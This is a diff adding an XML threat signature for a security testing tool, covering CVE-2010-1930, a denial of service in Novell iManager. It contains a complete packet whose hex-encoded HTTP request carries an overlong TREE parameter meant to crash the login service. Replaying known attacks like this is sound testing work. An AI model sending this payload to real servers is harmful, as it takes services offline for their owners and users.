@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Novell iManager Tree Name Denial of Service"/>
+    <EngDesc display="true" value="A denial of service vulnerability has been reported in Novell iManager. The vulnerability is due to insufficient validation of the TREE parameter during login access. This vulnerability may be exploited by remote unauthenticated attackers to cause abnormal termination of the affected service leading to a denial of service condition, by sending a maliciously crafted HTTP request to the target server."/>
+    <Intent display="true">
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="IPv6,HTTP over port 8080,HTTPS over port 8443"/>
+    <Type_Of_Equipment display="true"/>
+    <Known_Vendors_Affected display="true">
+      <item value="Novell"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Novell_iManager"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Novell_iManager_2.7.3_FTF2"/>
+      <item value="Novell_iManager_2.7.3"/>
+      <item value="Novell_iManager_2.7"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value=" CVE-2010-1930"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="cb596d0376ea044edc3bb9fc96e457bf"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="network"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634175638099067221"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1281951007" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="srcIP" type="ImperfectControls.IPv6Address" value="null" index="J"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="K"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="L"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="J"/>
+      <for index="K"/>
+      <for index="L"/>
+    </for>
+    <for index="E">
+      <for index="K"/>
+      <for index="J"/>
+      <for index="L"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:6B:F6:01" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$srcIP" Destination-Address="$destIP">
+        <TCP srcPort="60142" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="002E" Checksum="" UrgentPointer="0000" Options="0101080A2B667BB800000000" Payload="474554202F6E70732F736572766C65742F7765626163633F72616E6B3D7072696D61727926446F4C6F67696E3D7472756526666F7263654D61737465723D66616C736526757365726E616D653D61646D696E2670617373776F72643D666F6F62617226456E74726164612E783D313126456E74726164612E793D323226747265653D4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414120485454502F312E310D0A486F73743A203137322E31362E382E36343A383038300D0A4163636570742D456E636F64696E673A206964656E746974790D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520382E303B2057696E646F7773204E5420352E313B2054726964656E742F342E303B202E4E455420434C5220312E312E34333232290D0A4163636570743A20746578742F68746D6C2C6170706C69636174696F6E2F7868746D6C2B786D6C2C6170706C69636174696F6E2F786D6C3B713D302E392C2A2F2A3B713D302E380D0A4163636570742D4C616E67756167653A20656E2D75732C656E3B713D302E350D0A4163636570742D436861727365743A2049534F2D383835392D312C7574662D383B713D302E372C2A3B713D302E370D0A436F6E6E656374696F6E3A20636C6F73650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="E" Count="">
+      <Ethernet srcMac="00:0C:29:6B:F6:01" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$destIP" Destination-Address="$srcIP">
+          <TCP srcPort="$HTTPdestPort" destPort="60142" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="F821" Checksum="" UrgentPointer="0000" Options="0101080A0001529A2B667BB8" Payload="" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
